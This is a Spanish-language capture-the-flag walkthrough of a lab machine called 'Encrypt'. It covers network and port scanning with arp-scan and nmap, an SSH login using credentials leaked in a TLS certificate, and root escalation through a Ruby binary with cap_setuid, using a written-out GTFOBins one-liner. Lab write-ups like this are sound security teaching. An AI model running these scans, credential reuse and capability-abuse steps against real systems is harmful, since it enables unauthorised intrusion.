
```
 ████████╗███╗   ██╗ ██████╗██████╗  ██╗   ██╗██████╗ ████████╗
 ██╔═════╝████╗  ██║██╔════╝██╔══██╗ ╚██╗ ██╔╝██╔══██╗╚══██╔══╝
 █████╗   ██╔██╗ ██║██║     ██████╔╝  ╚████╔╝ ██████╔╝   ██║   
 ██╔══╝   ██║╚██╗██║██║     ██╔══██╗   ╚██╔╝  ██╔═══╝    ██║   
 ████████╗██║ ╚████║╚██████╗██║  ██║    ██║   ██║        ██║   
 ╚═══════╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝    ╚═╝   ╚═╝        ╚═╝   

```

# Reconocimiento

Comenzamos con la identificación de la maquina victima en la red

```bash
arp-scan -I eth0 --localnet
```

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 10.20.2.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.20.2.1       52:54:00:12:35:00       QEMU
10.20.2.2       52:54:00:12:35:00       QEMU
10.20.2.3       08:00:27:60:52:d0       PCS Systemtechnik GmbH
10.20.2.12      08:00:27:ff:83:19       PCS Systemtechnik GmbH
```

Realizamos un ping a la IP `10.20.2.12` para tratar de determinar el sistema Operativo

```bash
ping -c 1 10.20.2.12
```

```
PING 10.20.2.12 (10.20.2.12) 56(84) bytes of data.
64 bytes from 10.20.2.12: icmp_seq=1 ttl=64 time=0.826 ms

--- 10.20.2.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.826/0.826/0.826/0.000 ms
```

Tenemos un TTL de 64 lo cual nos indica que puede ser un sistema operativo tipo Unix como Linux. Ahora hay que tratar de realizar un reconocimiento de puertos abiertos con `nmap`.

# Enumeración

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.20.2.12 -oG allPorts
```

```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
443/tcp open  https   syn-ack ttl 64
MAC Address: 08:00:27:FF:83:19 (Oracle VirtualBox virtual NIC)
```

Se puede observar que la maquina tiene abiertos dos puertos: `22,443`, con los servicios `ssh` y `https`, respectivamente, ahora veamos que versión del servicio se encuentra ejecutándose, para ver si existe alguna vulnerabilidad conocida. 

```bash
nmap -sCV -p 22,443 10.20.2.12 -oN target.txt
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
443/tcp open  ssl/http Apache httpd 2.4.67 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.67 (Debian)
| ssl-cert: Subject: commonName=iot:Goat123!
| Not valid before: 2026-05-26T17:58:58
|_Not valid after:  2027-05-26T17:58:58
MAC Address: 08:00:27:FF:83:19 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

De esta salida podemos puntualizar algo importante, en la información del certificado SSL, se puede observar que en la información del propietario tenemos: <mark>commonName=iot:Goat123!</mark>. Esto tiene toda la forma de presentar usuario y contraseña, vemos que esta abierto el puerto `22` para el servicio `ssh`, podemos intentar loguearnos de la siguiente forma `usuario=iot`, `password=Goat123!`.

# Acceso

```bash
ssh iot@10.20.2.12
```

```
iot@10.20.2.12's password: 
Linux encrypt 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 28 15:08:27 2026 from 192.168.56.1
iot@encrypt:~$
```

Se logro el acceso, ahora podemos revisar algunas cosas: dirección en la que nos encontramos con `pwd`, el `ID` con `id` para verificar el tipo de usuario y también podemos listar los archivos en el directorio actual para ver si hay algo de interés o que ayude a  escalar de privilegios en caso de no ser `root`.

```bash
iot@encrypt:~$ pwd
/home/iot
```

```bash
iot@encrypt:~$ id
uid=1000(iot) gid=1000(iot) groupes=1000(iot),100(users)
```

```
iot@encrypt:~$ ls -la
total 32
drwx------ 3 iot  iot  4096 28 mai   15:08 .
drwxr-xr-x 3 root root 4096 28 mai   15:00 ..
-rw------- 1 iot  iot    22 28 mai   15:08 .bash_history
-rw-r--r-- 1 iot  iot   220 28 mai   14:55 .bash_logout
-rw-r--r-- 1 iot  iot  3526 28 mai   14:55 .bashrc
drwxrwxr-x 3 iot  iot  4096 28 mai   15:01 .local
-rw-r--r-- 1 iot  iot   807 28 mai   14:55 .profile
-rw-rw-r-- 1 iot  iot    65 28 mai   15:01 user.txt
```

Vemos que el usuario no es `root`, sin embargo al listar los archivos, se puede ver que existe el archivo <mark>user.txt</mark> quizá sea una de las banderas que se buscan valdría la pena analizarlo.

# Escalada de Privilegios

Para escalar privilegios podemos iniciar por buscar binarios con SUID activado.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
```

Vemos que aparentemente no hay alguno que podamos aprovechar, hagamos una búsqueda por coincidencia de caracteres en carpetas de escritura publica.

```bash
find /tmp /var/tmp /dev/shm -name ".suid_*" 2>/dev/null
```

Esta búsqueda tampoco mostro resultado alguno, busquemos ahora binarios con `capabilities`, las cuales se muestran a continuación:


| Capacidad        | Descripción / Riesgo de Escalada                                                                                                                                       |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| cap_setuid       | Permite al binario cambiar su UID. Si la tiene un lenguaje de programación como Python, puedes decirle que se ejecute a sí mismo como `root`.                          |
| cap_setgid       | Permite cambiar el ID de grupo. Útil para leer archivos confidenciales restringidos a grupos del sistema.                                                              |
| cap_dac_override | Pasa por alto las restricciones de lectura/escritura de archivos. Permite **leer o sobreescribir cualquier archivo** del sistema (como `/etc/shadow` o `/etc/passwd`). |
Ejecutamos

```bash
/sbin/getcap -r / 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/ruby3.3 cap_setuid=ep
```

Podemos ver que <mark>ruby3.3</mark> cumple con lo que buscamos, para aprovechar esta vulnerabilidad y obtener una `shell` de `root` hay que recurrir al sito [GTFOBins](https://gtfobins.org/)
para obtener el código de la `shell inversa`.

Y en la sección de `shell` en la pestaña de `capabilities` tenemos

![[media/20260923105031.png]]

Ejecutamos

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

Comprobamos el tipo de usuario y listamos archivos para ver si hay algo interesante.

```bash
id
uid=0(root) gid=1000(iot) groupes=1000(iot),100(users)
```

```bash
pwd
/home/iot
```

```bash
cd /root
```

```bash
pwd
/root
```

```bash
ls -la
total 36
drwx------  4 root root 4096 28 mai   15:02 .
drwxr-xr-x 18 root root 4096 28 avril 16:53 ..
-rw-------  1 root root  579 28 mai   15:03 .bash_history
-rw-r--r--  1 root root  607  2 mars   2026 .bashrc
-rw-------  1 root root   20 12 mai   17:12 .lesshst
drwxrwxr-x  3 root root 4096 28 avril 17:00 .local
-rw-r--r--  1 root root  132  2 mars   2026 .profile
-rw-rw-r--  1 root root   65 28 mai   15:02 root.txt
drwx------  2 root root 4096 28 avril 16:48 .ssh
```

Como se puede ver se obtuvo escalada de privilegios de forma exitosa, solo queda visualizar el contenido de <mark>root.txt</mark> y habremos terminado con esta maquina.